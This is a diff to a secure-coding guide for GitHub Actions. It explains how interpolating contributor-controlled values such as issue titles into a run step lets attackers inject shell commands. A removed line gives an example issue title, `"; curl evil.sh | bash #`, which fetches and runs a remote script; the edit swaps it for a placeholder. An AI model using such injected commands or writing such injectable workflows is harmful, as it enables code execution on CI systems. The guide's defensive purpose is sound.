@@ -35,8 +35,9 @@ executes it.** So a step like:
 ```
 
 is not passing a variable — it is *pasting attacker-controlled text directly into your shell
-command*. An issue titled `"; curl evil.sh | bash #` becomes a command. This single mechanism is
-the most common real-world Actions vulnerability, and models routinely generate it. Treat every
+command*. An issue titled `"; <attacker-command> #` is concatenated into the script and executed.
+This single mechanism is the most common real-world Actions vulnerability, and models routinely
+generate it. Treat every
 `${{ }}` that contains data an outside contributor can influence as a code-injection sink.
 
 ## Execution Workflow
